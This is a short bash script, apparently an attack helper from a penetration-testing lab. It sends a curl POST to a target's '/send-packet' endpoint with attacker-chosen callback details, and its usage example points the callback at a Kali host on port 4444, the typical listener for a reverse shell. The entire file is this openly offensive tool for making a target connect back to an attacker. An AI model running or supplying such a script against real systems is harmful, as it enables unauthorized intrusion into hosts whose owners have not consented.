#!/bin/bash

if [[ "$1" == "-h" || "$1" == "--help" || $# -lt 5 ]]; then
  echo "Usage: $0 TARGET_IP TARGET_PORT CALLBACK_IP CALLBACK_PORT PROTOCOL"
  echo
  echo "Arguments:"
  echo "  TARGET_IP       The IP address of the target server."
  echo "  TARGET_PORT     The port number on the target server."
  echo "  CALLBACK_IP     The IP address to include in the callback data."
  echo "  CALLBACK_PORT   The port number to include in the callback data."
  echo "  PROTOCOL        The protocol to specify (e.g., tcp, udp)."
  echo
  echo "Example:"
  echo "  $0 linux 80 kali 4444 tcp"
  exit 1
fi

TARGET_IP=$1
TARGET_PORT=$2
CALLBACK_IP=$3
CALLBACK_PORT=$4
PROTOCOL=$5

timeout 1s curl "http://${TARGET_IP}:${TARGET_PORT}/send-packet"  -H 'Content-Type: application/json' --data-raw '{"ip":"'${CALLBACK_IP}'","port":"'${CALLBACK_PORT}'","protocol":"'${PROTOCOL}'"}'

